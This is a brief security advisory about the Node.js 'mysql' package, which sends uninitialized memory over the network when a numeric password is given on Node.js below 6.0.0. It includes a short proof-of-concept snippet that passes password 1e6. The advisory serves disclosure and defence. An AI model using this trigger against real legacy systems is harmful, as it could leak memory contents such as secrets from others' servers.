title: Remote Memory Exposure
author: Сковорода Никита Андреевич (https://github.com/ChALkeR)
overview:
Affected versions of `mysql` package allocate and send an uninitialized memory chunk over network when a number is used as a password.

Only `mysql` running on Node.js versions below 6.0.0 is affected due to a throw added at Node.js side in newer versions.

PoC:
```
require('mysql').createConnection({
  host     : 'localhost',
  user     : 'user',
  password : 1e6,
  database : 'my_db'
}).connect();
```

Reported at 2017-03-15.
